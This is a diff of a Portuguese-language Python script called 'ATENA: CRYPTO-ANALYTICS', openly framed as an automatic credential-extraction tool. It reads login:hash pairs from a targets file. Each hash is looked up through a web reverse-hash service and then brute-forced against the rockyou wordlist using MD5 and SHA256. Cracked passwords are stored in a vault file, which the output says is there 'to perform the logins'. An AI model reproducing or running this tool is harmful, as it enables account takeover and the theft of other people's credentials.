@@ -2,42 +2,45 @@
 # -*- coding: utf-8 -*-
 """
 ATENA: CRYPTO-ANALYTICS v4.2
-Foco: Extração de Credenciais para Acesso e Transferência.
+Foco: Extração Automática de Credenciais.
 Copyright (c) 2026 Danilo Gomes.
 """
-from __future__ import annotations
-
 import hashlib
 import json
 import requests
-import concurrent.futures
+import os
 from datetime import datetime
 from pathlib import Path
-from argparse import ArgumentParser
+
+# ==========================================================
+# CONFIGURAÇÕES DA ATENA (Edite aqui se necessário)
+# ==========================================================
+ARQUIVO_ALVOS = "alvos.txt"      # Nome do arquivo com login:hash
+USAR_WEB = True                  # Ativa varredura na internet
+WORDLIST = "rockyou.txt"         # Nome da sua lista de senhas
+VAULT = "atena_vault.json"       # Onde os acessos serão salvos
+# ==========================================================
 
 class AtenaExtractor:
-    def __init__(self, wordlist: str | None = None, vault: str = "atena_vault.json"):
-        self.vault_path = vault
-        self.wordlist = self._load_wordlist(wordlist)
+    def __init__(self):
+        self.wordlist = self._load_wordlist(WORDLIST)
         self._init_vault()
 
     def _init_vault(self):
-        if not Path(self.vault_path).exists():
-            with open(self.vault_path, "w", encoding="utf-8") as f:
+        if not Path(VAULT).exists():
+            with open(VAULT, "w", encoding="utf-8") as f:
                 json.dump([], f)
 
-    def _load_wordlist(self, path: str | None) -> list[str]:
+    def _load_wordlist(self, path):
         if path and Path(path).exists():
             with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                 return [line.strip() for line in f if line.strip()]
         return []
 
-    def save_access(self, login: str, password: str, source: str):
-        """Armazena o acesso final para transferência."""
+    def save_access(self, login, password, source):
         try:
-            with open(self.vault_path, "r+", encoding="utf-8") as f:
+            with open(VAULT, "r+", encoding="utf-8") as f:
                 vault = json.load(f)
-                # Registro da conquista
                 entry = {
                     "data": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
                     "login": login,
@@ -52,13 +55,12 @@ class AtenaExtractor:
                 f.truncate()
             return True
         except Exception as e:
-            print(f"⚠️ Falha ao salvar no Vault: {e}")
+            print(f"⚠️ Erro ao salvar: {e}")
             return False
 
-    def solve_hash(self, target_hash: str, use_web: bool) -> str | None:
-        """Tenta descriptografar usando todos os meios disponíveis."""
-        # 1. Tentativa via OSINT (Web)
-        if use_web:
+    def solve_hash(self, target_hash):
+        # 1. Varredura Web (OSINT)
+        if USAR_WEB:
             try:
                 url = f"https://api.hackertarget.com/reversehash/?q={target_hash}"
                 r = requests.get(url, timeout=5)
@@ -67,52 +69,44 @@ class AtenaExtractor:
             except:
                 pass
 
-        # 2. Tentativa via Metabolismo Local (Wordlist)
+        # 2. Metabolismo Local (Wordlist)
         if self.wordlist:
             for word in self.wordlist:
                 encoded = word.encode('utf-8')
-                # Testa MD5 e SHA256 simultaneamente
-                if hashlib.md5(encoded).hexdigest() == target_hash:
-                    return word
-                if hashlib.sha256(encoded).hexdigest() == target_hash:
-                    return word
+                if hashlib.md5(encoded).hexdigest() == target_hash: return word
+                if hashlib.sha256(encoded).hexdigest() == target_hash: return word
         return None
 
 def main():
-    parser = ArgumentParser(description="ATENA: CRYPTO-ANALYTICS v4.2")
-    parser.add_argument("--input", required=True, help="Arquivo com login:hash ou string direta")
-    parser.add_argument("--wordlist", help="Arquivo de senhas")
-    parser.add_argument("--web", action="store_true", help="Ativar varredura na rede")
-    args = parser.parse_args()
-
-    engine = AtenaExtractor(args.wordlist)
+    engine = AtenaExtractor()
     
-    print(f"🧬 ATENA: CRYPTO-ANALYTICS v4.2")
+    print(f"🧬 ATENA: CRYPTO-ANALYTICS v4.2 [ATIVO]")
     print(f"👤 Copyright (c) 2026 Danilo Gomes")
     print("-" * 50)
 
-    # Processamento de dados
-    raw_data = []
-    if Path(args.input).exists():
-        with open(args.input, 'r') as f:
-            raw_data = [l.strip() for l in f if ":" in l]
-    else:
-        raw_data = [args.input] if ":" in args.input else []
+    # Verifica se o arquivo de alvos existe
+    if not Path(ARQUIVO_ALVOS).exists():
+        print(f"❌ Erro: O arquivo '{ARQUIVO_ALVOS}' não foi encontrado.")
+        return
 
-    for entry in raw_data:
+    with open(ARQUIVO_ALVOS, 'r') as f:
+        linhas = [l.strip() for l in f if ":" in l]
+
+    for entry in linhas:
         login, h = entry.split(':', 1)
-        print(f"🔎 Analisando: {login}...")
+        h = h.strip()
+        print(f"🔎 Colapsando: {login}...")
         
-        revelada = engine.solve_hash(h.strip(), args.web)
+        revelada = engine.solve_hash(h)
         
         if revelada:
-            engine.save_access(login.strip(), revelada, "Web/Local")
-            print(f"🔓 ACESSO CONQUISTADO: {login} | SENHA: {revelada}")
+            engine.save_access(login.strip(), revelada, "Rede/Local")
+            print(f"🔓 CONQUISTADO: {login} | SENHA: {revelada}")
         else:
             print(f"🔒 Falha no colapso de {login}.")
 
     print("-" * 50)
-    print("📊 Verifique 'atena_vault.json' para realizar os logins.")
+    print(f"📊 Fim do Ciclo. Acessos registrados em: {VAULT}")
 
 if __name__ == "__main__":
     main()
